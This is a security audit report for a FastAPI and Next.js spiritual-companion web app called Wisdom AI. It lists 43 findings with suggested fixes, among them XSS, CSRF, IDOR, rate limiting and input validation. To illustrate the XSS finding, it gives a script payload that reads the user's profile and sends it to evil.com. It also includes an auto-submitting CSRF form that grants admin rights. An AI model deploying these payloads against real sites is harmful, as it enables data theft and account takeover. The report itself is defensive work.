# 🔍 SENIOR SDE COMPREHENSIVE SECURITY & ARCHITECTURE AUDIT

**Audit Date:** November 15, 2025  
**Auditor Role:** Senior Software Development Engineer  
**Scope:** Full-stack web application (FastAPI + Next.js)  
**Application:** Wisdom AI - Spiritual AI Companion Platform

---

## 📊 EXECUTIVE SUMMARY

**Overall Security Score: 🟡 72/100** (Previously 95/100 after initial security fixes)

**Critical Issues Found:** 8  
**High Priority Issues:** 12  
**Medium Priority Issues:** 15  
**Low Priority Issues:** 8

**Status:** ⚠️ **PRODUCTION-READY WITH FIXES REQUIRED**

---

## 🚨 CRITICAL ISSUES (Priority 1 - Fix Immediately)

### 1. ⚠️ **Token Expiration Mismatch** - CRITICAL
**Severity:** 🔴 **CRITICAL**  
**Location:** `main.py:58`, `web/app/api/login/route.ts:17`

**Issue:**
- Backend JWT expires in 15 minutes (`ACCESS_TOKEN_EXPIRE_MINUTES = 15`)
- Frontend cookie expires in 7 days (`maxAge: 60 * 60 * 24 * 7`)
- Users will have expired tokens but valid cookies, causing silent auth failures

**Impact:**
- Users logged out after 15 minutes despite "Remember me"
- Poor UX with unexpected 401 errors
- Users must re-authenticate frequently

**Fix:**
```python
# main.py - Increase token expiration to match cookie
ACCESS_TOKEN_EXPIRE_MINUTES = 43200  # 30 days (or match cookie duration)
```

**OR implement refresh tokens:**
```python
def create_refresh_token(data: dict):
    expire = datetime.utcnow() + timedelta(days=7)
    to_encode = data.copy()
    to_encode.update({"exp": expire, "type": "refresh"})
    return jwt.encode(to_encode, JWT_SECRET, algorithm=JWT_ALGORITHM)
```

---

### 2. ⚠️ **XSS Vulnerability in Chat/Comments** - CRITICAL
**Severity:** 🔴 **CRITICAL**  
**Location:** Chat responses, user comments, verse notes

**Issue:**
- No HTML sanitization on user-generated content
- Using `react-markdown` which can execute scripts if not configured properly
- Comments and notes stored/displayed without sanitization

**Attack Vector:**
```javascript
// Malicious user could inject:
<script>fetch('/api/profile').then(r=>r.json()).then(d=>fetch('https://evil.com?data='+JSON.stringify(d)))</script>
```

**Fix:**
```bash
# Install DOMPurify
npm install dompurify @types/dompurify
```

```typescript
// Create sanitizer utility
import DOMPurify from 'dompurify'

export const sanitizeHtml = (dirty: string) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  })
}
```

Use in components:
```tsx
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userContent) }} />
```

---

### 3. ⚠️ **No CSRF Protection** - CRITICAL
**Severity:** 🔴 **CRITICAL**  
**Location:** All state-changing API endpoints

**Issue:**
- No CSRF tokens on POST/PUT/DELETE requests
- Cookie-based auth vulnerable to CSRF attacks
- Attacker could force user actions via malicious sites

**Attack Vector:**
```html
<!-- Attacker's site -->
<form action="https://wisdom-ai.com/api/admin/users/123" method="POST">
  <input type="hidden" name="is_admin" value="true">
</form>
<script>document.forms[0].submit()</script>
```

**Fix:**
Add CSRF middleware:
```python
# main.py
from fastapi_csrf_protect import CsrfProtect
from pydantic import BaseModel

class CsrfSettings(BaseModel):
    secret_key: str = JWT_SECRET

@CsrfProtect.load_config
def get_csrf_config():
    return CsrfSettings()

app.add_middleware(
    CsrfProtect,
    cookie_samesite="strict",
    cookie_secure=True
)
```

Frontend:
```typescript
// Include CSRF token in all mutations
const csrfToken = getCookie('csrf_token')
headers.set('X-CSRF-Token', csrfToken)
```

---

### 4. ⚠️ **SQL Injection via JSON Fields** - HIGH/CRITICAL
**Severity:** 🟠 **HIGH**  
**Location:** Collections, notes, verse metadata

**Issue:**
- Using JSON strings in SQLModel fields (`verse_ids: str = "[]"`)
- Manual JSON parsing without validation
- Potential NoSQL-style injection in JSON queries

**Vulnerable Code:**
```python
# main.py:1113
verse_ids = json.loads(collection.verse_ids or "[]")
# If attacker controls verse_ids, could inject malicious JSON
```

**Fix:**
1. Use proper JSON columns:
```python
from sqlalchemy import Column, JSON

class Collection(SQLModel, table=True):
    verse_ids: List[str] = Field(default=[], sa_column=Column(JSON))
```

2. Validate all JSON data:
```python
from pydantic import validator

class CollectionRequest(BaseModel):
    verse_ids: List[str]
    
    @validator('verse_ids')
    def validate_verse_ids(cls, v):
        if len(v) > 1000:  # Limit array size
            raise ValueError('Too many verses')
        for vid in v:
            if not re.match(r'^[a-zA-Z0-9_\-\.]+$', vid):
                raise ValueError('Invalid verse ID format')
        return v
```

---

### 5. ⚠️ **No Rate Limiting on Critical Endpoints** - HIGH
**Severity:** 🟠 **HIGH**  
**Location:** Most endpoints except `/signup` and `/login`

**Issue:**
- Only `/signup` (5/min) and `/login` (10/min) have rate limiting
- Chat, verse saving, admin actions unlimited
- Vulnerable to DDoS and abuse

**Missing Rate Limits:**
```python
# No limits on:
@app.post("/chat")  # Could spam AI requests
@app.post("/verses/{verse_id}/share")  # Share link spam
@app.post("/admin/verses")  # Admin endpoint abuse
@app.get("/admin/analytics")  # Data scraping
```

**Fix:**
```python
# Add global rate limit
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address, default_limits=["100/hour"])

# Per-endpoint limits
@app.post("/chat")
@limiter.limit("30/hour")  # 30 chat messages per hour
def chat(...):
    ...

@app.post("/verses/{verse_id}/share")
@limiter.limit("10/minute")
def share_verse(...):
    ...

@app.get("/admin/analytics")
@limiter.limit("60/hour")  # Prevent data scraping
def admin_analytics(...):
    ...
```

---

### 6. ⚠️ **Insecure Direct Object Reference (IDOR)** - HIGH
**Severity:** 🟠 **HIGH**  
**Location:** Multiple endpoints

**Issue:**
- User can access other users' data by changing IDs
- No proper authorization checks on resources

**Vulnerable Endpoints:**
```python
# main.py:1045 - Can access ANY user's history
@app.get("/history/{user_id}")
def get_history(user_id: str, user: User = Depends(get_current_user)):
    # Only checks if user is authenticated, not if they own the resource!
    
# main.py:1703 - Can update ANY user if you know their ID
@app.put("/admin/users/{user_id}")
def update_user(user_id: int, ...):
    # Only checks is_admin, should verify admin isn't modifying themselves
```

**Fix:**
```python
@app.get("/history/{user_id}")
def get_history(user_id: str, current_user: User = Depends(get_current_user)):
    # Verify user owns the resource
    if user_id != current_user.uuid and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")
    # ... rest of code

@app.get("/collections/{collection_id}")
def get_collection(collection_id: int, user: User = Depends(get_current_user)):
    with Session(engine) as session:
        collection = session.get(Collection, collection_id)
        if not collection:
            raise HTTPException(status_code=404)
        
        # Verify ownership for private collections
        if not collection.is_public and collection.user_id != user.id:
            raise HTTPException(status_code=403, detail="Access denied")
        # ...
```

---

### 7. ⚠️ **Missing Input Validation** - HIGH
**Severity:** 🟠 **HIGH**  
**Location:** Multiple endpoints

**Issue:**
- No length limits on text fields
- No content validation
- Could lead to database bloat, DoS

**Vulnerable:**
```python
class ChatRequest(BaseModel):
    message: str  # No max length!

class NoteRequest(BaseModel):
    note: str  # Could be 100MB of text!
```

**Fix:**
```python
from pydantic import Field, constr

class ChatRequest(BaseModel):
    message: constr(min_length=1, max_length=2000) = Field(
        ..., description="User message (max 2000 chars)"
    )

class NoteRequest(BaseModel):
    note: constr(min_length=1, max_length=5000) = Field(
        ..., description="Verse note (max 5000 chars)"
    )

class CollectionRequest(BaseModel):
    name: constr(min_length=1, max_length=100)
    description: Optional[constr(max_length=500)] = None
    verse_ids: List[str] = Field(default=[], max_items=500)  # Limit array size
```

---

### 8. ⚠️ **Hardcoded Production URLs** - MEDIUM/HIGH
**Severity:** 🟡 **MEDIUM**  
**Location:** `main.py:1265`

**Issue:**
```python
share_url = f"https://wisdom-ai.com/share/{token}"
```
- Hardcoded domain won't work in dev/staging
- Should use environment variable

**Fix:**
```python
# .env
FRONTEND_URL=https://wisdom-ai.com

# main.py
FRONTEND_URL = os.getenv("FRONTEND_URL", "http://localhost:3000")

share_url = f"{FRONTEND_URL}/share/{token}"
```

---

## 🟠 HIGH PRIORITY ISSUES (Priority 2 - Fix Within 1 Week)

### 9. No Password Reset Flow
**Issue:** Forgot password endpoint exists but incomplete
**Location:** `web/app/(auth)/forgot-password/page.tsx`
**Fix:** Implement email verification and token-based password reset

### 10. No Email Verification
**Issue:** Users can signup with any email without verification
**Impact:** Fake accounts, spam, email spoofing
**Fix:** Send verification emails, require confirmation before full access

### 11. No Account Lockout
**Issue:** Unlimited login attempts
**Impact:** Brute force attacks possible
**Fix:** Lock account after 5 failed attempts, implement cooldown

### 12. Insecure Media File Serving
**Issue:** All media files publicly accessible
**Location:** `/media/audio/*`, `/media/images/*`
**Fix:** Require authentication, use signed URLs for private content

### 13. No Audit Logging for Admin Actions
**Issue:** Admin actions not logged
**Impact:** No accountability, can't track malicious admin behavior
**Fix:** Log all admin actions with timestamps and user IDs

### 14. Missing Content Security Policy (CSP)
**Issue:** No CSP headers
**Impact:** XSS attacks easier to execute
**Fix:** Add CSP headers in middleware

```typescript
// web/middleware.ts
export function middleware(req: NextRequest) {
  const response = NextResponse.next()
  
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;"
  )
  
  response.headers.set('X-Content-Type-Options', 'nosniff')
  response.headers.set('X-Frame-Options', 'DENY')
  response.headers.set('X-XSS-Protection', '1; mode=block')
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')
  
  return response
}
```

### 15. Sensitive Data in Error Messages
**Issue:** Error messages expose system details
```python
raise HTTPException(status_code=500, detail=f"PDF processing failed: {str(e)}")
```
**Fix:** Generic error messages in production, detailed logging server-side

### 16. No Session Management
**Issue:** JWTs can't be invalidated
**Impact:** Stolen tokens valid until expiration
**Fix:** Implement token blacklist or session store

### 17. Missing HTTPS Enforcement
**Issue:** No redirect from HTTP to HTTPS
**Fix:** Add middleware to enforce HTTPS in production

### 18. Weak CORS Configuration
**Issue:** CORS allows credentials but origins from env variable
```python
ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "http://localhost:3000").split(",")
```
**Fix:** Validate and whitelist specific origins, no wildcards

### 19. No API Versioning
**Issue:** Breaking changes will affect all clients
**Fix:** Implement `/api/v1/` versioning

### 20. Database Credentials in Code
**Issue:** Default database URL in code
```python
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://wisdom_user:wisdom_pass@localhost:5432/wisdom_ai")
```
**Fix:** Fail startup if DATABASE_URL not set in production

---

## 🟡 MEDIUM PRIORITY ISSUES (Priority 3 - Fix Within 1 Month)

### 21. No Request Size Limits
**Fix:** Add request size limits to prevent DoS
```python
app.add_middleware(
    RequestSizeLimit,
    max_request_size=10 * 1024 * 1024  # 10MB
)
```

### 22. Insufficient Password Requirements
**Current:** 8 chars, 1 upper, 1 lower, 1 number
**Missing:** Special characters, common password check
**Fix:** Use `zxcvbn` or similar for password strength

### 23. No Database Connection Pooling Configuration
**Issue:** May hit connection limits under load
**Fix:** Configure SQLAlchemy pool size

### 24. Missing Database Migrations
**Issue:** Using `create_all()` instead of migrations
**Fix:** Use Alembic for schema versioning

### 25. No Monitoring/Logging Strategy
**Issue:** No structured logging, metrics, or alerts
**Fix:** Implement logging framework (structlog), metrics (Prometheus)

### 26. No Database Backups Strategy
**Issue:** No automated backups configured
**Fix:** Set up automated daily backups with retention policy

### 27. Timezone Issues
**Issue:** Using `datetime.utcnow()` everywhere (deprecated in Python 3.12)
**Fix:** Use `datetime.now(timezone.utc)`

### 28. No Proper Error Boundaries
**Issue:** Frontend error boundary exists but minimal
**Fix:** Add error reporting service (Sentry)

### 29. No Pagination on List Endpoints
**Issue:** `/admin/users`, `/collections` return all results
**Fix:** Add offset/limit pagination

```python
@app.get("/admin/users")
def list_users(
    skip: int = 0, 
    limit: int = 100,
    current_user: User = Depends(get_current_user)
):
    if limit > 100:
        limit = 100  # Max page size
    ...
```

### 30. Missing Request ID Tracing
**Issue:** Hard to trace requests across services
**Fix:** Add correlation ID middleware

### 31. No Health Check Endpoint with Details
**Issue:** `/api/health` too simple
**Fix:** Add detailed health checks for DB, cache, external services

### 32. Frontend Dependencies Outdated
**Issue:** Using older Next.js 14.2.8 (current is 14.2.15)
**Fix:** Regular dependency updates, security scanning

### 33. No Secrets Management
**Issue:** Secrets in .env file
**Fix:** Use secrets manager (AWS Secrets Manager, Azure Key Vault)

### 34. Inefficient N+1 Queries
**Location:** Profile endpoint loads chat summaries separately
**Fix:** Use SQLModel's relationship loading

### 35. No Caching Strategy
**Issue:** Repeated database queries for same data
**Fix:** Implement Redis caching for frequently accessed data

---

## 🔵 LOW PRIORITY ISSUES (Priority 4 - Technical Debt)

### 36. Console.error in Production
**Issue:** Error details exposed to client console
**Fix:** Conditional logging based on environment

### 37. No Code Splitting
**Issue:** Large bundle size
**Fix:** Implement dynamic imports for heavy components

### 38. Missing TypeScript Strict Null Checks
**Fix:** Enable `strictNullChecks` in tsconfig

### 39. No API Documentation
**Issue:** API_DOCUMENTATION.md exists but not interactive
**Fix:** Use FastAPI's automatic OpenAPI/Swagger docs

### 40. No End-to-End Tests
**Fix:** Add Playwright or Cypress tests

### 41. Duplicate /history Endpoint
**Issue:** Two identical history endpoints (lines 1045 and 1528)
**Fix:** Remove duplicate

### 42. No Graceful Shutdown
**Fix:** Handle SIGTERM/SIGINT for graceful shutdown

### 43. Missing Dependency Injection Patterns
**Fix:** Better separation of concerns, testability

---

## ✅ POSITIVE FINDINGS

1. ✅ **Bcrypt password hashing** implemented correctly
2. ✅ **JWT authentication** properly configured
3. ✅ **Rate limiting** on auth endpoints
4. ✅ **CORS** configured (though needs tightening)
5. ✅ **Environment variables** for secrets
6. ✅ **PostgreSQL** for production (not SQLite)
7. ✅ **TypeScript** strict mode enabled
8. ✅ **React Error Boundary** implemented
9. ✅ **HTTPOnly cookies** for token storage
10. ✅ **Password strength** validation
11. ✅ **Input validation** with Pydantic
12. ✅ **SQL injection** protection via SQLModel ORM
13. ✅ **Consistent UI** with shared components
14. ✅ **Mobile responsive** design

---

## 📋 IMMEDIATE ACTION ITEMS

### This Week (Critical Fixes)
1. ⚠️ Fix token expiration mismatch
2. ⚠️ Add XSS protection (DOMPurify)
3. ⚠️ Implement CSRF protection
4. ⚠️ Fix IDOR vulnerabilities
5. ⚠️ Add rate limiting to all endpoints
6. ⚠️ Add input validation (max lengths)

### Next Week (High Priority)
7. Implement password reset flow
8. Add email verification
9. Account lockout after failed logins
10. Add CSP headers
11. Implement audit logging
12. Add session management

### This Month (Medium Priority)
13. Set up database migrations
14. Implement pagination
15. Add health check details
16. Set up monitoring/logging
17. Database backup strategy
18. Update dependencies

---

## 🎯 SECURITY SCORE BREAKDOWN

| Category | Score | Details |
|----------|-------|---------|
| Authentication | 75/100 | ✅ JWT, bcrypt ⚠️ Session mgmt, lockout |
| Authorization | 60/100 | ⚠️ IDOR, CSRF missing |
| Input Validation | 70/100 | ✅ Pydantic ⚠️ Max lengths, sanitization |
| Data Protection | 65/100 | ✅ HTTPOnly cookies ⚠️ XSS, CSRF |
| Infrastructure | 75/100 | ✅ PostgreSQL, env vars ⚠️ Backups, monitoring |
| Code Quality | 80/100 | ✅ TypeScript, shared components ⚠️ Duplicates |
| Error Handling | 70/100 | ✅ Try/catch ⚠️ Info leakage |
| Rate Limiting | 50/100 | ⚠️ Only 2 endpoints protected |

**Overall: 72/100** 🟡

---

## 📝 RECOMMENDATIONS

### Short Term (1-2 weeks)
1. **Security Fixes:** Address all 8 critical issues immediately
2. **Testing:** Add integration tests for auth flows
3. **Documentation:** Document all API endpoints with examples
4. **Monitoring:** Set up basic error tracking (Sentry)

### Medium Term (1-3 months)
1. **Architecture:** Implement proper layered architecture
2. **Performance:** Add caching layer (Redis)
3. **Scalability:** Prepare for horizontal scaling
4. **DevOps:** Set up CI/CD pipeline with security scanning

### Long Term (3-6 months)
1. **Microservices:** Consider separating AI/ML service
2. **Real-time:** Add WebSocket support for live updates
3. **Analytics:** Implement proper analytics pipeline
4. **Mobile:** Native mobile app development

---

## 🔧 TOOLS RECOMMENDED

### Security
- **Bandit** - Python security linter
- **Safety** - Dependency vulnerability scanner
- **npm audit** - Node.js dependency scanner
- **Snyk** - Continuous security monitoring
- **OWASP ZAP** - Penetration testing

### Monitoring
- **Sentry** - Error tracking
- **Prometheus** - Metrics
- **Grafana** - Dashboards
- **ELK Stack** - Log aggregation

### Testing
- **Pytest** - Backend unit tests
- **Vitest** - Frontend unit tests
- **Playwright** - E2E tests
- **K6** - Load testing

---

## 📊 CONCLUSION

The Wisdom AI application has a **solid foundation** with proper password hashing, JWT authentication, and database security. However, there are **critical security gaps** that must be addressed before production deployment.

**Priority Order:**
1. 🔴 **Week 1:** Fix critical security issues (XSS, CSRF, IDOR, rate limiting)
2. 🟠 **Week 2-3:** Implement high-priority security features
3. 🟡 **Month 1-2:** Address medium priority technical debt
4. 🔵 **Ongoing:** Continuous security monitoring and improvements

**Estimated Effort:** 3-4 weeks of dedicated development to reach production-ready security standards.

---

**Report Generated:** November 15, 2025  
**Next Audit:** Recommended after critical fixes (December 2025)
